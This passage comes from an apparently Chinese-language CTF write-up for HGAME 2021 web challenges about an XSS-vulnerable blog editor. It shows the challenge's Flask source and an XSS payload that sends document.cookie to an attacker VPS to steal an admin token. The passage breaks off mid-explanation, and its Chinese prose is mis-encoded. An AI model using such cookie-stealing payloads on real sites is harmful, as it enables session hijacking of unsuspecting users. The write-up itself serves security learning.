attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>,filename=<span class="token punctuation">'</span>css/common.css<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>ONLINE BLOG EDITOR<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>,filename=<span class="token punctuation">'</span>js/jquery-3.5.1.min.js<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">        <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            $<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/contents"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">let</span> substr <span class="token operator">=</span> <span class="token string">"{{ substr }}"</span>                <span class="token keyword">let</span> replacement <span class="token operator">=</span> <span class="token string">"{{ replacement | safe }}"</span>                <span class="token keyword">let</span> output <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"output"</span><span class="token punctuation">)</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> data<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">let</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span>                    div<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span> replacement<span class="token punctuation">)</span>                    output<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>div<span class="token punctuation">)</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Online Blog Editor<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navigation<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Editor<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/flag<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Flag<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>About<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Help<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ol</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>main<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Post to Zuckonit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>main-content<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>output<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre><p>æ¨¡æ¿é‡Œçš„ <code>let substr = "{{ substr }}"</code> æ˜¯å°†ç‰¹æ®Šå­—ç¬¦å¦‚ å¼•å· <code>"</code> ã€<code>&lt;&gt;</code> è½¬ä¹‰äº†çš„ã€‚</p><p>è€Œ <code>let replacement = "{{ replacement | safe }}"</code> å‡ºæ¥æ˜¯ä¿ç•™åŸå‹çš„ã€‚</p><p>äºæ˜¯è¿™é‡Œå°±æœ‰æ¼æ´ã€‚</p><p>å°±æ„é€ ä¸€ä¸ª payload æŠŠå¼•å·é—­åˆï¼Œç„¶åå¸¦ç€ cookie æ‰“åˆ° VPS ä¸Šã€‚</p><pre class="language-none"><code class="language-none">meow"+$.get("http://VPSIP/"+document.cookie);//</code></pre><p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210221221935061.png"></p><p>post çš„å†…å®¹çš„è¯å°±æ”¾ä¸ªæŒ‡å‘ preview çš„ iframeã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>preview<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span></code></pre><p>åç«¯æ›¿æ¢åè¿”å›</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>preview<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span></code></pre><p>è¿˜æ˜¯æœ‰æ•ˆçš„ã€‚ </p><p>ç„¶åç®—ä¸ª md5 æäº¤ã€‚</p><p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210222222308322.png"></p><pre class="language-none"><code class="language-none">token=568fda45ba279640fc974e68b592366d82e1b74dfbc18c92ba4df52e6870e7c2</code></pre><p>æœ€åæ”¹ cookieï¼Œæ‹¿ flag.</p><p><code>hgame{simple_csp_bypass&amp;a_small_mistake_on_the_replace_function}</code></p><p>è¿™å½“ç„¶æ˜¯éé¢„æœŸè§£å•¦ 2333.</p><h3 id="Post-to-zuckonit-another-version"><a href="#Post-to-zuckonit-another-version" class="headerlink" title="Post to zuckonit another version"></a>Post to zuckonit another version</h3><blockquote><p>d1gg12 çš„åšå®¢è¢«æ—¥ç©¿ä»¥åï¼Œä»–æƒ³åŠæ³•å­¦äº†æ›´æ·±å…¥çš„ XSS é˜²æŠ¤æ–¹æ³•ï¼Œ ç°åœ¨è¿™ä¸ªåšå®¢çœ‹ä¸Šå»å·²ç»åšä¸å¯æ‘§äº†â€¦æ˜¯è¿™æ ·å—ï¼Ÿ<br> <strong>hint1:</strong> æŸ¥çœ‹ç½‘é¡µæºä»£ç <br> <strong>hint2:</strong> å…³äºâ€œæ›´æ·±å…¥çš„xssé˜²æŠ¤æ–¹æ³•â€ï¼š çœ‹çœ‹è¿”å›å¤´ï¼Ÿ<br> <strong>hint3:</strong> RegExp<br> <strong>hint4:</strong> <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace</a></p><p><a href="http://zuckonit-2-another.0727.site:5050/">http://zuckonit-2-another.0727.site:5050/</a> </p></blockquote><p>ï¼ˆæ¥å¤ç°ä¸€ä¸‹ï¼‰</p><p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210224011141306.png"></p><p><code>app.py</code></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Set-Cookie'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"token=WELCOME TO HGAME 2021.;"</span>    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Security-Policy'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"default-src 'self'; script-src 'self';"</span>    <span class="token keyword">return</span> response<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/preview'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">preview</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'substr'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        substr <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'substr'</span><span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        substr <span class="token operator">=</span> <span class="token string">""</span>    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>        render_template<span class="token punctuation">(</span><span class="token string">"preview.html"</span><span class="token punctuation">,</span> substr<span class="token operator">=</span>substr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> response<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/send'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'content'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        content <span class="token operator">=</span> escape_index<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'contents'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            content_list <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'contents'</span><span class="token punctuation">]</span>            content_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>content<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            content_list <span class="token operator">=</span> <span class="token punctuation">[</span>content<span class="token punctuation">]</span>        session<span class="token punctuation">[</span><span class="token string">'contents'</span><span class="token punctuation">]</span> <span class="token operator">=</span> content_list        <span class="token keyword">return</span> <span class="token string">"post has been sent."</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"WELCOME TO HGAME 2021 :)"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/search'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">replace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'substr'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'substr'</span><span class="token punctuation">]</span> <span class="token operator">=</span> escape_replace<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'substr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"replace success"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"There is no content to search any more"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/contents'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'contents'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        content_list <span class="token operator">=</span> jsonify<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'contents'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        content_list <span class="token operator">=</span> jsonify<span class="token punctuation">(</span><span class="token string">'&lt;i&gt;2021-02-12&lt;/i&gt;&lt;p&gt;Happy New Year every guys! '</span>                               <span class="token string">'Maybe it is nearly done now.&lt;/p&gt;'</span><span class="token punctuation">,</span>                               <span class="token string">'&lt;i&gt;2021-02-11&lt;/i&gt;&lt;p&gt;Busy preparing for the Chinese New Year... '</span>                               <span class="token string">'And I add some new features to this editor, maybe you can take a try. '</span>                               <span class="token string">'But it has not done yet, I\'m not sure if it can be safe from attacks.&lt;/p&gt;'</span><span class="token punctuation">,</span>                               <span class="token string">'&lt;i&gt;2021-02-07&lt;/i&gt;&lt;p&gt;so many hackers here, I am going to add some strict rules.&lt;/p&gt;'</span><span class="token punctuation">,</span>                               <span class="token string">'&lt;i&gt;2021-02-06&lt;/i&gt;&lt;p&gt;I have tried to learn HTML the whole yesterday, '</span>                               <span class="token string">'and I finally made this ONLINE BLOG EDITOR. Feel free to write down your thoughts.&lt;/p&gt;'</span><span class="token punctuation">,</span>                               <span class="token string">'&lt;i&gt;2021-02-05&lt;/i&gt;&lt;p&gt;Yesterday, I watched &lt;i&gt;The Social Network&lt;/i&gt;. '</span>                               <span class="token string">'It really astonished me. Something flashed me.&lt;/p&gt;'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> content_list<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/code'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> Response<span class="token punctuation">(</span>response<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'code'</span><span class="token punctuation">:</span> session<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'application/json'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        code <span class="token operator">=</span> create_code<span class="token punctuation">(</span><span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> code        <span class="token keyword">return</span> Response<span class="token punctuation">(</span>response<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'code'</span><span class="token punctuation">:</span> code<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'application/json'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"29342ru89j3thisisfakecookieq983h23ijfq2ojifrnq92h2"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"hgame{G3t_fl@g_s0_Easy?No_way!!wryyyyyyyyy}"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Only admin can get the flag, your token shows that you're not admin!"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/clear'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">clear_session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'contents'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string">"ALL contents are cleared."</span><span class="token keyword">def</span> <span class="token function">escape_index</span><span class="token punctuation">(</span>original<span class="token punctuation">)</span><span class="token punctuation">:</span>    content <span class="token operator">=</span> original    content_iframe <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>        <span class="token string">r"^(&lt;?/?iframe)\s+.*?(src=[\"'][a-zA-Z/]{1,8}[\"']).*?(&gt;?)$"</span><span class="token punctuation">,</span> <span class="token string">r"\1 \2 \3"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>    <span class="token keyword">if</span> content_iframe <span class="token operator">!=</span> content <span class="token keyword">or</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">r"^(&lt;?/?iframe)\s+(src=[\"'][a-zA-Z/]{1,8}[\"'])$"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> content_iframe    <span class="token keyword">else</span><span class="token punctuation">:</span>        content <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r"&lt;*/?(.*?)&gt;?"</span><span class="token punctuation">,</span> <span class="token string">r"\1"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>        <span class="token keyword">return</span> content<span class="token keyword">def</span> <span class="token function">escape_replace</span><span class="token punctuation">(</span>original<span class="token punctuation">)</span><span class="token punctuation">:</span>    content <span class="token operator">=</span> original    content <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r"[&lt;&gt;\"\\]"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>    <span class="token keyword">return</span> content<span class="token keyword">def</span> <span class="token function">create_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    hashobj <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>    hashobj<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    code_hash <span class="token operator">=</span> hashobj<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> code_hash</code></pre><p>æ”¹äº†ä¸ª <code>search</code>ï¼Œè¿‡æ»¤é‡Œå¤šäº† <code>"</code> <code>\</code> ä¸èƒ½åƒä¸Šä¸€é¢˜é‚£æ ·é—­åˆé‚£ä¸ª åŒå¼•å· äº†ã€‚</p><p><code>preview.html</code> ä¸­çš„ js æ”¹æˆäº†</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    $<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/contents"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> content <span class="token operator">=</span> <span class="token string">"{{ substr | safe }}"</span>        <span class="token keyword">let</span> output <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"output"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> data<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">let</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span>            <span class="token keyword">let</span> substr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">)</span>            div<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;b class="search_result"&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>content<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/b&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>            output<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>div<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>å¯è§å¼„äº†ä¸ª æ­£åˆ™æ›¿æ¢ã€‚</p><p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210224013320418.png" alt="å®˜æ–¹ writeup"></p><p>æ ¹æ®å®˜æ–¹ WriteUpï¼Œå¯ä»¥é€šè¿‡æ„é€  <code>{ä»»æ„åŒ¹é…çš„å­—ç¬¦ä¸²}|{æƒ³è¦æ³¨â¼Šçš„å­—ç¬¦ä¸²}</code> è¿™æ ·çš„æ­£åˆ™è¡¨è¾¾å¼æ¥ç»™é¡µé¢æ³¨å…¥å…ƒç´ ã€‚</p><p>å†æ ¹æ® <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace">String.prototype.replace()</a> çš„ç‰¹æ®Šå˜é‡å</p><p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210224013614092.png" alt="ç‰¹æ®Šå˜é‡å"></p><p>ä¸»é¡µè¿˜æ˜¯ post </p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>preview<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span></code></pre><p>äºæ˜¯å°±å¯ä»¥åˆ©ç”¨ åˆ†ç»„ ç»“åˆ <code>$n</code> 